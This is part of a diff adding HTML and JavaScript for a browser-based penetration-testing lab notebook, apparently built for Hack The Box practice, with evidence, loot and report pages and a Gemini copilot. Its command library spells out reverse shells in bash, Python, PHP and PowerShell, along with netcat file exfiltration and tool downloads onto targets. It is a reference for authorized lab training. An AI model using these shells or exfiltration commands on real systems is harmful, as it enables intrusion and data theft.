+      <div class="row">
+        <button class="btn" id="vSave" type="button">Save machine</button>
+        <button class="btn-ghost hidden" id="vCancelEdit" type="button">Cancel edit</button>
+        <span class="muted small" id="vMsg"></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="row" style="margin-bottom:12px">
+        <input id="vSearch" type="search" placeholder="Search vault&hellip;" autocomplete="off" style="flex:2;min-width:160px">
+        <select id="vFilterDiff" style="flex:1;min-width:110px"><option value="">All difficulties</option><option>Easy</option><option>Medium</option><option>Hard</option><option>Insane</option></select>
+        <select id="vFilterPlat" style="flex:1;min-width:130px"><option value="">All platforms</option><option>Hack The Box</option><option>TryHackMe</option><option>Proving Grounds</option><option>VulnHub</option><option>Other</option></select>
+        <select id="vSort" style="flex:1;min-width:130px"><option value="new">Sort: Newest</option><option value="old">Sort: Oldest</option><option value="name">Sort: Name A&ndash;Z</option><option value="diff">Sort: Difficulty</option></select>
+      </div>
+      <div id="vaultList"></div>
+    </div>
+  </section>
+
+  <!-- ============ 7. EVIDENCE (structured findings) ============ -->
+  <section class="page" id="sec-evidence">
+    <div class="page-head">
+      <h2>Evidence</h2>
+      <p>Structured findings for your report. Each entry has a severity, evidence, and remediation &mdash; these feed the Reporting Engine. Link each finding to a host when you can.</p>
+    </div>
+    <div class="card">
+      <h3 id="eFormTitle">Add a finding</h3>
+      <div class="grid2">
+        <div class="field"><label for="eTitle">Title *</label><input id="eTitle" type="text" placeholder="e.g. Anonymous SMB Share" autocomplete="off"></div>
+        <div class="field"><label for="eHost">Host</label><select id="eHost"></select></div>
+        <div class="field"><label for="eSeverity">Severity</label>
+          <select id="eSeverity"><option>Critical</option><option>High</option><option selected>Medium</option><option>Low</option><option>Info</option></select>
+        </div>
+        <div class="field"><label for="eFinding">Finding</label><input id="eFinding" type="text" placeholder="What is wrong, in one or two sentences" autocomplete="off"></div>
+      </div>
+      <div class="field"><label for="eEvidence">Evidence (paste command output, file paths, screenshot notes)</label><textarea id="eEvidence" rows="4" placeholder="smbclient output, file contents, where you saw it&hellip;"></textarea></div>
+      <div class="field"><label for="eRemediation">Remediation</label><textarea id="eRemediation" rows="2" placeholder="How should this be fixed?"></textarea></div>
+      <div class="row">
+        <button class="btn" id="eSave" type="button">Save finding</button>
+        <button class="btn-ghost hidden" id="eCancelEdit" type="button">Cancel edit</button>
+        <span class="muted small" id="eMsg"></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="row" style="margin-bottom:12px">
+        <input id="eSearch" type="search" placeholder="Search findings&hellip;" autocomplete="off" style="flex:2;min-width:160px">
+        <select id="eFilterSev" style="flex:1;min-width:120px"><option value="">All severities</option><option>Critical</option><option>High</option><option>Medium</option><option>Low</option><option>Info</option></select>
+        <select id="eFilterHost" style="flex:1;min-width:140px"><option value="">All hosts</option></select>
+      </div>
+      <div id="evidenceList"></div>
+    </div>
+  </section>
+
+  <!-- ============ 8. LOOT LOCKER ============ -->
+  <section class="page" id="sec-loot">
+    <div class="page-head">
+      <h2>Loot Locker</h2>
+      <p>Everything you capture during an assessment &mdash; credentials, hashes, files, and flags. Stored only in this browser.</p>
+    </div>
+    <div class="card">
+      <h3 id="lFormTitle">Add loot</h3>
+      <div class="grid2">
+        <div class="field"><label for="lKind">Category</label>
+          <select id="lKind"><option value="credential">Credential</option><option value="hash">Hash</option><option value="file">File</option><option value="flag">Flag</option></select>
+        </div>
+        <div class="field"><label for="lHost">Host</label><select id="lHost"></select></div>
+      </div>
+      <div id="lFieldsCred">
+        <div class="grid2">
+          <div class="field"><label for="lUser">Username</label><input id="lUser" type="text" autocomplete="off"></div>
+          <div class="field"><label for="lPass">Password</label><input id="lPass" type="text" autocomplete="off"></div>
+        </div>
+        <div class="field"><label for="lService">Service</label><input id="lService" type="text" placeholder="e.g. SMB, WinRM, SSH" autocomplete="off"></div>
+      </div>
+      <div id="lFieldsHash" class="hidden">
+        <div class="grid2">
+          <div class="field"><label for="lHashType">Hash type</label>
+            <select id="lHashType"><option>NTLM</option><option>NTLMv2</option><option>AS-REP</option><option>Kerberoast</option><option>Other</option></select>
+          </div>
+          <div class="field"><label for="lHashUser">Username (if known)</label><input id="lHashUser" type="text" autocomplete="off"></div>
+        </div>
+        <div class="field"><label for="lHashValue">Hash value</label><input id="lHashValue" type="text" autocomplete="off" style="font-family:var(--mono);font-size:12.5px"></div>
+      </div>
+      <div id="lFieldsFile" class="hidden">
+        <div class="field"><label for="lFileName">Filename</label><input id="lFileName" type="text" placeholder="e.g. backup.zip" autocomplete="off"></div>
+        <div class="field"><label for="lFileNote">Note</label><input id="lFileNote" type="text" placeholder="Where you found it, why it matters" autocomplete="off"></div>
+      </div>
+      <div id="lFieldsFlag" class="hidden">
+        <div class="grid2">
+          <div class="field"><label for="lFlagType">Flag</label>
+            <select id="lFlagType"><option>user.txt</option><option>root.txt</option><option>Other</option></select>
+          </div>
+          <div class="field"><label for="lFlagValue">Flag value</label><input id="lFlagValue" type="text" autocomplete="off" style="font-family:var(--mono);font-size:12.5px"></div>
+        </div>
+      </div>
+      <div class="row">
+        <button class="btn" id="lSave" type="button">Save loot</button>
+        <button class="btn-ghost hidden" id="lCancelEdit" type="button">Cancel edit</button>
+        <span class="muted small" id="lMsg"></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="row" style="margin-bottom:12px">
+        <input id="lSearch" type="search" placeholder="Search loot&hellip;" autocomplete="off" style="flex:2;min-width:160px">
+        <select id="lFilterKind" style="flex:1;min-width:120px"><option value="">All categories</option><option value="credential">Credentials</option><option value="hash">Hashes</option><option value="file">Files</option><option value="flag">Flags</option></select>
+        <select id="lFilterHost" style="flex:1;min-width:140px"><option value="">All hosts</option></select>
+      </div>
+      <div id="lootList"></div>
+    </div>
+  </section>
+
+  <!-- ============ 9. PERSONAL NOTES ============ -->
+  <section class="page" id="sec-notes">
+    <div class="page-head">
+      <h2>Personal Notes</h2>
+      <p>Markdown notes, auto-saved in this browser. Write in Markdown, flip to Preview to read it rendered.</p>
+    </div>
+    <div class="notes-wrap">
+      <div class="resize-x">
+        <div class="row" style="margin-bottom:10px">
+          <input id="nSearch" type="search" placeholder="Search notes&hellip;" autocomplete="off" style="flex:1">
+          <button class="btn btn-sm" id="nNew" type="button">+ New</button>
+        </div>
+        <div id="noteList"></div>
+      </div>
+      <div class="card" style="margin-bottom:0">
+        <div class="row" style="margin-bottom:10px">
+          <input id="noteTitle" type="text" placeholder="Note title" autocomplete="off" style="flex:1">
+          <button class="btn-ghost btn-sm" id="notePreviewBtn" type="button">Preview</button>
+          <button class="btn-ghost btn-sm" id="noteExport" type="button">Export JSON</button>
+          <button class="btn-ghost btn-sm btn-danger" id="noteDelete" type="button">Delete</button>
+        </div>
+        <textarea id="noteBody" rows="16" placeholder="# My note&#10;&#10;Write in **Markdown**. Auto-saves as you type.&#10;&#10;- headings, lists, code blocks, links&#10;- `inline code` and ```fenced blocks```"></textarea>
+        <div id="notePreview" class="md-preview hidden" style="min-height:300px"></div>
+        <p class="small muted" id="noteSaved" style="margin:8px 0 0">No note selected.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 10. REPORTING ENGINE ============ -->
+  <section class="page" id="sec-report">
+    <div class="page-head">
+      <h2>Reporting Engine</h2>
+      <p>One click builds assessment notes from your workspace data &mdash; hosts, findings, credentials, and loot. Nothing is invented: empty sections say so honestly.</p>
+    </div>
+    <div class="card">
+      <div class="row">
+        <button class="btn" id="reportGen" type="button">Generate Assessment Notes</button>
+        <button class="btn-ghost" id="reportDownload" type="button" disabled>Download .md</button>
+        <button class="btn-ghost" id="reportCopy" type="button" disabled>Copy Markdown</button>
+        <span class="muted small" id="reportMeta"></span>
+      </div>
+      <div style="margin-top:14px" id="reportPreview"><p class="muted">No report generated yet. Click &ldquo;Generate Assessment Notes&rdquo; to build one from your current workspace data.</p></div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap-wide">
+    <h3 style="font-size:14px">Keyboard shortcuts</h3>
+    <table>
+      <tr><td><kbd>Ctrl</kbd> + <kbd>K</kbd></td><td>Focus command search</td></tr>
+      <tr><td><kbd>Ctrl</kbd> + <kbd>P</kbd></td><td>Command palette &mdash; search commands, sections, and actions</td></tr>
+      <tr><td><kbd>1</kbd> &ndash; <kbd>9</kbd>, <kbd>0</kbd></td><td>Switch section (1 Workspace, 2 Dashboard, 3 Worm Method, 4 Commands, 5 Attack Path, 6 Scan, 7 Vault, 8 Evidence, 9 Loot, 0 Notes)</td></tr>
+      <tr><td><kbd>Ctrl</kbd> + <kbd>Enter</kbd></td><td>Send scan output to AI (from the Scan Analysis box)</td></tr>
+      <tr><td><kbd>Esc</kbd></td><td>Close the AI Copilot panel / command palette</td></tr>
+    </table>
+    <p style="margin-top:12px">Offline-first: everything except the AI Copilot works with no internet. Your API key, hosts, findings, loot, notes, vault, and progress never leave this browser except for AI requests you send to Google Gemini.</p>
+    <p>For authorized lab use only &mdash; Hack The Box machines and systems you have permission to test.</p>
+  </div>
+</footer>
+
+<!-- ============ AI COPILOT PANEL (docked) ============ -->
+<button id="aiToggle" type="button">AI Copilot</button>
+<aside id="aiPanel" aria-label="AI Copilot">
+  <div class="ai-head">
+    <h2>AI Copilot</h2>
+    <span class="pill nokey" id="aiKeyPill"><span class="dot"></span><span id="aiKeyPillText">No key</span></span>
+    <span class="spacer" style="flex:1"></span>
+    <button class="btn-ghost btn-sm" id="aiClose" type="button">Close (Esc)</button>
+  </div>
+  <div class="ai-key">
+    <label class="small muted" for="aiKey">Gemini API key &mdash; stored only in this browser, never in the file</label>
+    <div class="row">
+      <input id="aiKey" type="password" placeholder="Paste your Gemini API key" autocomplete="off" style="flex:1">
+      <button class="btn btn-sm" id="aiKeySave" type="button">Save</button>
+      <button class="btn-ghost btn-sm" id="aiKeyForget" type="button">Forget</button>
+    </div>
+    <div class="ai-status">Get a key at <a href="https://aistudio.google.com/" target="_blank" rel="noopener">Google AI Studio</a>. Without a key, AI features show &ldquo;Gemini API key required.&rdquo; and nothing is sent.</div>
+  </div>
+  <div class="ai-ctx" id="aiContext">
+    <b>Context sent with every prompt:</b>
+    <div id="aiContextBody"></div>
+    <div class="ctx-line small">Credential values are included in the context sent to Gemini; only usernames are shown here.</div>
+  </div>
+  <div class="ai-qa" id="aiQa">
+    <button class="qa-btn" type="button" data-qa="nmap">Analyze Nmap Scan</button>
+    <button class="qa-btn" type="button" data-qa="gobuster">Analyze Gobuster Output</button>
+    <button class="qa-btn" type="button" data-qa="smb">Analyze SMB Enumeration</button>
+    <button class="qa-btn" type="button" data-qa="privesc">Suggest Privilege Escalation</button>
+    <button class="qa-btn" type="button" data-qa="report">Generate Report Notes</button>
+  </div>
+  <div id="aiLog" aria-live="polite"></div>
+  <div class="ai-composer">
+    <textarea id="aiInput" rows="2" placeholder="Ask the Copilot&hellip; (Enter to send, Shift+Enter for a new line)"></textarea>
+    <button class="btn" id="aiSend" type="button">Send</button>
+  </div>
+</aside>
+
+<!-- ============ COMMAND PALETTE ============ -->
+<div id="palette" role="dialog" aria-label="Command palette">
+  <div class="palette-box">
+    <input id="paletteInput" type="text" placeholder="Type a command, section, or action&hellip;  (Esc to close)" autocomplete="off">
+    <div id="paletteList"></div>
+  </div>
+</div>
+
+<div id="toasts" aria-live="polite"></div>
+
+<script>
+"use strict";
+/* ================= DATA ================= */
+var CATS = {
+  recon:     {label:"Reconnaissance",      short:"Recon"},
+  web:       {label:"Web Enumeration",     short:"Web"},
+  smb:       {label:"SMB Enumeration",     short:"SMB"},
+  shells:    {label:"Reverse Shells",      short:"Shells"},
+  stabilize: {label:"Shell Stabilization", short:"Stabilize"},
+  privesc:   {label:"Privilege Escalation",short:"PrivEsc"},
+  transfer:  {label:"File Transfer",       short:"Transfer"}
+};
+
+/* Only real, standard, canonical commands. Placeholders <IP> <YOUR-IP> <PORT> <FILE> <USER> <PASS> <SHARE> to be replaced. */
+var COMMANDS = [
+/* ---- Recon ---- */
+{cat:"recon", title:"Nmap service scan", cmd:`nmap -sC -sV -oA nmap/scan <IP>`,
+ desc:"Run default scripts and detect service versions; save results in all formats.",
+ use:"First pass on any target to learn what services are listening."},
+{cat:"recon", title:"Nmap full TCP scan", cmd:`nmap -p- --min-rate 1000 -oA nmap/all <IP>`,
+ desc:"Scan all 65,535 TCP ports quickly.",
+ use:"Find services hiding on non-standard ports."},
+{cat:"recon", title:"Rustscan fast sweep", cmd:`rustscan -a <IP> -- -sC -sV`,
+ desc:"Fast port discovery, then hand the open ports to Nmap for service detection.",
+ use:"Speed up the initial port sweep, especially on larger ranges."},
+{cat:"recon", title:"Nmap version detection", cmd:`nmap -sV -p <PORT> <IP>`,
+ desc:"Detect the version of a service on one specific port.",
+ use:"Confirm a service version before searching for known exploits."},
+{cat:"recon", title:"Nmap UDP top ports", cmd:`nmap -sU --top-ports 20 <IP>`,
+ desc:"Scan the 20 most common UDP ports.",
+ use:"Check for DNS, SNMP, or other UDP services."},
+/* ---- Web Enumeration ---- */
+{cat:"web", title:"Gobuster directory brute-force", cmd:`gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt`,
+ desc:"Brute-force directories and files on a web server.",
+ use:"Find hidden pages, admin panels, and backup files."},
+{cat:"web", title:"Feroxbuster recursive scan", cmd:`feroxbuster -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt`,
+ desc:"Recursive directory brute-forcing with smart filtering of noise.",
+ use:"Deep web enumeration when Gobuster output is noisy or shallow."},
+{cat:"web", title:"Nikto web scanner", cmd:`nikto -h http://<IP>/`,
+ desc:"Scan a web server for known issues and misconfigurations.",
+ use:"Quick pass for outdated software and dangerous files."},
+{cat:"web", title:"Curl response headers", cmd:`curl -s -I http://<IP>/`,
+ desc:"Fetch only the HTTP response headers.",
+ use:"Learn the server, framework, and cookies without downloading the page."},
+{cat:"web", title:"Curl robots.txt", cmd:`curl -s http://<IP>/robots.txt`,
+ desc:"Fetch the robots.txt file.",
+ use:"Find disallowed paths that often point to interesting areas."},
+/* ---- SMB Enumeration ---- */
+{cat:"smb", title:"smbclient list shares", cmd:`smbclient -L //<IP> -N`,
+ desc:"List SMB shares without credentials (null session).",
+ use:"First SMB check on any Windows target."},
+{cat:"smb", title:"smbclient connect to share", cmd:`smbclient //<IP>/<SHARE> -N`,
+ desc:"Connect to a share without credentials.",
+ use:"Browse a readable share for files and credentials."},
+{cat:"smb", title:"NetExec SMB fingerprint", cmd:`netexec smb <IP>`,
+ desc:"Check SMB signing, OS version, and whether the host is up.",
+ use:"Fast SMB fingerprinting across one or many hosts."},
+{cat:"smb", title:"NetExec list shares (with creds)", cmd:`netexec smb <IP> -u <USER> -p <PASS> --shares`,
+ desc:"List shares using valid credentials.",
+ use:"Find writable or sensitive shares once you have credentials."},
+{cat:"smb", title:"CrackMapExec SMB check", cmd:`crackmapexec smb <IP>`,
+ desc:"Legacy SMB enumeration tool, predecessor of NetExec.",
+ use:"Same checks as NetExec on systems where it is installed."},
+{cat:"smb", title:"enum4linux full enumeration", cmd:`enum4linux -a <IP>`,
+ desc:"Full SMB enumeration: users, groups, shares, and policies.",
+ use:"Deep SMB recon when other tools give little."},
+/* ---- Reverse Shells ---- */
+{cat:"shells", title:"Netcat listener", cmd:`nc -lvnp <PORT>`,
+ desc:"Netcat listener waiting for an incoming reverse shell.",
+ use:"Start this before triggering any reverse shell payload."},
+{cat:"shells", title:"Bash reverse shell", cmd:`bash -i >& /dev/tcp/<YOUR-IP>/<PORT> 0>&1`,
+ desc:"Bash reverse shell connecting back to your listener.",
+ use:"Linux targets where bash is available."},
+{cat:"shells", title:"Python reverse shell", cmd:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR-IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+ desc:"Python reverse shell one-liner.",
+ use:"Targets with Python but no bash networking."},
+{cat:"shells", title:"PHP reverse shell", cmd:`php -r '$sock=fsockopen("<YOUR-IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`,
+ desc:"PHP reverse shell one-liner.",
+ use:"Web servers with PHP, e.g. via file upload or remote code execution."},
+{cat:"shells", title:"PowerShell reverse shell", cmd:`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<YOUR-IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
+ desc:"PowerShell reverse shell one-liner.",
+ use:"Windows targets with PowerShell."},
+/* ---- Shell Stabilization ---- */
+{cat:"stabilize", title:"Spawn a PTY", cmd:`python3 -c 'import pty; pty.spawn("/bin/bash")'`,
+ desc:"Spawn a proper TTY inside your raw shell.",
+ use:"First step to stabilize a reverse shell."},
+{cat:"stabilize", title:"Set terminal type", cmd:`export TERM=xterm`,
+ desc:"Set the terminal type so editors and the clear command work.",
+ use:"Right after spawning a PTY."},
+{cat:"stabilize", title:"Fix terminal after Ctrl+Z", cmd:`stty raw -echo; fg`,
+ desc:"Restore your terminal after backgrounding the shell with Ctrl+Z, then press Enter twice.",
+ use:"The classic stty fix once you have a PTY."},
+{cat:"stabilize", title:"rlwrap listener", cmd:`rlwrap nc -lvnp <PORT>`,
+ desc:"Listener with arrow-key history and line editing.",
+ use:"Start the listener with rlwrap for a much nicer shell."},
+/* ---- Privilege Escalation ---- */
+{cat:"privesc", title:"Check identity", cmd:`id`,
+ desc:"Show your user, groups, and privileges.",
+ use:"First command in any shell — know who you are."},
+{cat:"privesc", title:"List sudo rights", cmd:`sudo -l`,
+ desc:"List commands you may run with sudo.",
+ use:"Find sudo rights that lead to root."},
+{cat:"privesc", title:"Find SUID binaries", cmd:`find / -perm -4000 -type f 2>/dev/null`,
+ desc:"Find binaries with the SUID bit set.",
+ use:"Spot SUID binaries abusable for privilege escalation."},
+{cat:"privesc", title:"Find capabilities", cmd:`getcap -r / 2>/dev/null`,
+ desc:"Find files with Linux capabilities set.",
+ use:"Spot binaries with dangerous capabilities, like cap_setuid."},
+{cat:"privesc", title:"Check system cron jobs", cmd:`cat /etc/crontab`,
+ desc:"Show system-wide scheduled cron jobs.",
+ use:"Find cron jobs running as root that you can influence."},
+{cat:"privesc", title:"Run LinPEAS", cmd:`./linpeas.sh`,
+ desc:"Run LinPEAS to enumerate privilege escalation vectors.",
+ use:"After transferring linpeas.sh to the target."},
+/* ---- File Transfer ---- */
+{cat:"transfer", title:"Python HTTP server", cmd:`python3 -m http.server 8000`,
+ desc:"Serve files from your machine over HTTP.",
+ use:"Host tools on your attacker box for the target to download."},
+{cat:"transfer", title:"Download with wget", cmd:`wget http://<YOUR-IP>:8000/<FILE>`,
+ desc:"Download a file from your HTTP server.",
+ use:"Pull linpeas.sh or other tools onto the target."},
+{cat:"transfer", title:"Download with certutil (Windows)", cmd:`certutil -urlcache -f http://<YOUR-IP>:8000/<FILE> <FILE>`,
+ desc:"Download a file on Windows using certutil.",
+ use:"Windows targets without curl or wget."},
+{cat:"transfer", title:"Copy over SSH (SCP)", cmd:`scp <FILE> <USER>@<IP>:/tmp/`,
+ desc:"Copy a file over SSH.",
+ use:"Move files when you have SSH credentials."},
+{cat:"transfer", title:"Netcat receive file", cmd:`nc -lvnp <PORT> > <FILE>`,
+ desc:"Receive a file over netcat.",
+ use:"Transfer or exfiltrate files when HTTP is blocked."},
+{cat:"transfer", title:"Netcat send file", cmd:`nc <YOUR-IP> <PORT> < <FILE>`,
+ desc:"Send a file over netcat to a waiting listener.",
+ use:"Pair with the receiver command above."}
+];
+
+var OBJECTIVES = {
+  recon: {label:"Reconnaissance", blurb:"Map the target before touching anything else.",
+    workflow:["Run the Nmap service scan","Run the full TCP port scan","Check the top UDP ports","Record versions and unusual ports","Decide the next objective from the open ports"],
+    next:["Ports 80/443 open? Go to Web Enumeration","Port 445 open? Go to SMB Enumeration","Found a version? Search for known exploits for it"]},
+  web: {label:"Web Enumeration", blurb:"Find what the web server is hiding.",
+    workflow:["Fetch headers and robots.txt with curl","Run Gobuster directory brute-force","Run Feroxbuster for recursive coverage","Run Nikto for known issues","Inspect findings: forms, versions, interesting paths"],
+    next:["Found a login? Try default credentials","Parameter found? Test for LFI / SQLi","Interesting file? Download and inspect it"]},
+  smb: {label:"SMB Enumeration", blurb:"Windows shares and users are often the way in.",
+    workflow:["smbclient — list shares","enum4linux — full enumeration","netexec — fingerprint and shares","RID brute force — enumerate users","Share inspection — browse readable shares"],
+    next:["Readable share? List and download its files","Found credentials? Try them on WinRM / SSH","Users enumerated? Password spray"]},
+  shells: {label:"Reverse Shells", blurb:"Turn access into an interactive shell.",
+    workflow:["Start a listener (nc, or rlwrap nc)","Pick a payload matching the target OS","Trigger the payload (upload, RCE, or injection)","Catch the shell","Move to Shell Stabilization"],
+    next:["Shell caught? Go to Shell Stabilization","No callback? Check the firewall and payload IP/port","Try a different payload language"]},
+  stabilize: {label:"Shell Stabilization", blurb:"Make a raw shell usable.",
+    workflow:["Spawn a PTY with python3","Export TERM=xterm","Ctrl+Z, then stty raw -echo; fg","Confirm: clear, arrow keys, and editors work"],
+    next:["Stable shell? Go to Privilege Escalation","Still raw? Retry the PTY spawn or try another TTY method","Shell drops? Re-catch it with the listener still running"]},
+  privesc: {label:"Privilege Escalation", blurb:"Go from user to root / SYSTEM.",
+    workflow:["Run id and sudo -l","Transfer and run LinPEAS (or WinPEAS)","Check SUID binaries, capabilities, and cron jobs","Pick one vector and exploit it","Document the path for the report"],
+    next:["Vector found? Exploit it carefully","Got root / SYSTEM? Grab flags and loot","Document every step for the report"]},
+  transfer: {label:"File Transfer", blurb:"Move tools onto the target — and loot off it.",
+    workflow:["Start python3 http.server on your box","Download with wget, curl, or certutil on the target","Verify the file arrived (ls, size)","Run the transferred tool"],
+    next:["Tool transferred? Run it (LinPEAS, WinPEAS)","Transfer blocked? Try certutil or netcat","Need exfil? Reverse the direction"]}
+};
+
+var WORM_STEPS = [
+  {t:"Enumerate", d:"Map the target: ports, services, versions."},
+  {t:"Identify Attack Surface", d:"List every entry point: web, SMB, FTP, users."},
+  {t:"Gain Foothold", d:"Get a shell or valid credentials."},
+  {t:"Escalate Privileges", d:"Go from user to root / SYSTEM."},
+  {t:"Document Findings", d:"Write up the path, impact, and fix."}
+];
+
+/* Example chains only — shown when the current host has no data yet. */
+var EXAMPLE_CHAINS = [
+  {title:"SMB to SYSTEM", nodes:[
+    {n:"Nmap", d:"Find open ports — 445 (SMB) and 5985 (WinRM) stand out."},
+    {n:"SMB Enum", d:"List shares and users; look for readable files."},
+    {n:"Credentials", d:"Harvest credentials from shares, configs, or spraying."},
+    {n:"WinRM", d:"Log in with the found credentials."},
+    {n:"SYSTEM", d:"Escalate to SYSTEM via service or token abuse."}]},
+  {title:"Web App to Root", nodes:[
+    {n:"Web App", d:"Enumerate directories, parameters, and versions."},
+    {n:"LFI", d:"Read local files via inclusion — /etc/passwd, logs."},
+    {n:"RCE", d:"Turn inclusion into code execution."},
+    {n:"Shell", d:"Catch a reverse shell from the RCE."},
+    {n:"Privilege Escalation", d:"Enumerate with LinPEAS and escalate to root."}]}
+];
+
+var QA_TEMPLATES = {
+  nmap:"Analyze this Nmap scan output. List the most interesting services, likely attack paths, and the next 3 commands I should run:\n\n",
+  gobuster:"Analyze this Gobuster output. Which directories look most interesting and why? What should I check first?\n\n",
+  smb:"Analyze this SMB enumeration output. Which shares and users matter, and what should I try next?\n\n",
+  privesc:"Based on this system information, suggest the most likely privilege escalation paths, in order, with the exact commands:\n\n",
+  report:"Turn these findings into clear penetration test report notes: summary, impact, and remediation, in plain language:\n\n"
+};
+
+/* Port -> detection rule. Only real, standard tools and flags. pri 1 = highest. */
+var PORT_RULES = {
+  21:{service:"FTP", pri:2, title:"FTP detected",
+    advice:"Try anonymous login (anonymous / anonymous) and list files. Check for writable directories.",
+    cmds:[{t:"FTP client", c:"ftp <IP>"},
+          {t:"Nmap FTP anon script", c:"nmap --script ftp-anon -p 21 <IP>"}]},
+  22:{service:"SSH", pri:3, title:"SSH detected",
+    advice:"Check the version for known issues. Try valid credentials. Only test authentication where you are authorized.",
+    cmds:[{t:"SSH login", c:"ssh <USER>@<IP>"},
+          {t:"Nmap SSH scripts", c:"nmap --script ssh-auth-methods,ssh-hostkey -p 22 <IP>"}]},
+  53:{service:"DNS", pri:3, title:"DNS detected",
+    advice:"Test for a zone transfer and enumerate subdomains.",
+    cmds:[{t:"Zone transfer attempt", c:"dig axfr <DOMAIN> @<IP>"},
+          {t:"Nmap DNS brute script", c:"nmap --script dns-brute -p 53 <IP>"}]},
+  80:{service:"HTTP", pri:2, title:"HTTP detected",
+    advice:"Enumerate directories and files, check headers and robots.txt, fingerprint the server.",
+    cmds:[{t:"Feroxbuster recursive scan", c:"feroxbuster -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt"},
+          {t:"Nikto web scanner", c:"nikto -h http://<IP>/"},
+          {t:"Curl response headers", c:"curl -s -I http://<IP>/"}]},
+  443:{service:"HTTPS", pri:2, title:"HTTPS detected",
+    advice:"Same enumeration as HTTP, over TLS. Check the certificate for names and expiry.",
+    cmds:[{t:"Feroxbuster recursive scan", c:"feroxbuster -u https://<IP>/ -w /usr/share/wordlists/dirb/common.txt"},
+          {t:"Nikto web scanner", c:"nikto -h https://<IP>/"},
+          {t:"Curl response headers", c:"curl -s -I https://<IP>/"}]},
+  139:{service:"SMB (NetBIOS)", pri:1, title:"SMB / NetBIOS detected",
+    advice:"Enumerate shares and users. Try a null session first.",
+    cmds:[{t:"smbclient list shares", c:"smbclient -L //<IP> -N"},
+          {t:"enum4linux full enumeration", c:"enum4linux -a <IP>"}]},
+  445:{service:"SMB", pri:1, title:"SMB detected",
+    advice:"Enumerate shares, users, and policies. Try a null session, then valid credentials if you have them.",
+    cmds:[{t:"smbclient list shares", c:"smbclient -L //<IP> -N"},
+          {t:"enum4linux full enumeration", c:"enum4linux -a <IP>"},
+          {t:"NetExec SMB fingerprint", c:"netexec smb <IP>"}]},
+  1433:{service:"MSSQL", pri:2, title:"MSSQL detected",
+    advice:"Try valid credentials with impacket. Check for an empty sa password.",
+    cmds:[{t:"impacket MSSQL client", c:"impacket-mssqlclient <USER>@<IP>"},
+          {t:"Nmap MSSQL scripts", c:"nmap --script ms-sql-info,ms-sql-empty-password -p 1433 <IP>"},
+          {t:"sqsh client", c:"sqsh -S <IP> -U <USER>"}]},
+  3306:{service:"MySQL", pri:2, title:"MySQL detected",
+    advice:"Try valid credentials. Check for an empty root password and readable databases.",
+    cmds:[{t:"MySQL client", c:"mysql -h <IP> -u <USER> -p"},
+          {t:"Nmap MySQL scripts", c:"nmap --script mysql-empty-password,mysql-info -p 3306 <IP>"}]},
+  3389:{service:"RDP", pri:2, title:"RDP detected",
+    advice:"Check the encryption level. Try valid credentials with a proper RDP client.",
+    cmds:[{t:"FreeRDP client", c:"xfreerdp /u:<USER> /p:<PASS> /v:<IP>"},
+          {t:"Nmap RDP script", c:"nmap --script rdp-enum-encryption -p 3389 <IP>"}]},
+  5432:{service:"PostgreSQL", pri:2, title:"PostgreSQL detected",
+    advice:"Try valid credentials and list databases and tables.",
+    cmds:[{t:"psql client", c:"psql -h <IP> -U <USER> -d <DB>"},
+          {t:"Nmap PostgreSQL script", c:"nmap --script pgsql-brute -p 5432 <IP>"}]},
+  5985:{service:"WinRM", pri:2, title:"WinRM detected",
+    advice:"Log in with valid credentials. WinRM is the Windows remote shell — often the way in after SMB.",
+    cmds:[{t:"Evil-WinRM", c:"evil-winrm -i <IP> -u <USER> -p <PASS>"},
+          {t:"CrackMapExec WinRM", c:"crackmapexec winrm <IP> -u <USER> -p <PASS>"}]},
+  5986:{service:"WinRM (HTTPS)", pri:2, title:"WinRM over HTTPS detected",
+    advice:"Same as WinRM, over TLS. Use Evil-WinRM with valid credentials.",
+    cmds:[{t:"Evil-WinRM", c:"evil-winrm -i <IP> -u <USER> -p <PASS>"},
+          {t:"CrackMapExec WinRM", c:"crackmapexec winrm <IP> -u <USER> -p <PASS>"}]},
+  6379:{service:"Redis", pri:3, title:"Redis detected",
+    advice:"Check whether authentication is required. Unauthenticated Redis can expose data and allow writes.",
+    cmds:[{t:"Redis client", c:"redis-cli -h <IP>"},
+          {t:"Nmap Redis script", c:"nmap --script redis-info -p 6379 <IP>"}]},
+  27017:{service:"MongoDB", pri:3, title:"MongoDB detected",
+    advice:"Check whether authentication is required and list databases.",
+    cmds:[{t:"MongoDB shell", c:"mongosh --host <IP>"},
+          {t:"Nmap MongoDB script", c:"nmap --script mongodb-info -p 27017 <IP>"}]},
+  389:{service:"LDAP", pri:3, title:"LDAP detected",
+    advice:"Try an anonymous bind and enumerate the directory tree.",
+    cmds:[{t:"ldapsearch anonymous bind", c:"ldapsearch -x -H ldap://<IP> -b \"dc=example,dc=com\""},
+          {t:"Nmap LDAP script", c:"nmap --script ldap-search -p 389 <IP>"}]},
+  636:{service:"LDAPS", pri:3, title:"LDAPS detected",
+    advice:"Same as LDAP, over TLS. Try an anonymous bind first.",
+    cmds:[{t:"ldapsearch anonymous bind", c:"ldapsearch -x -H ldaps://<IP> -b \"dc=example,dc=com\""}]}
+};
+
+/* ================= UTILS ================= */
+function $(s){ return document.querySelector(s); }
+function $$(s){ return Array.prototype.slice.call(document.querySelectorAll(s)); }
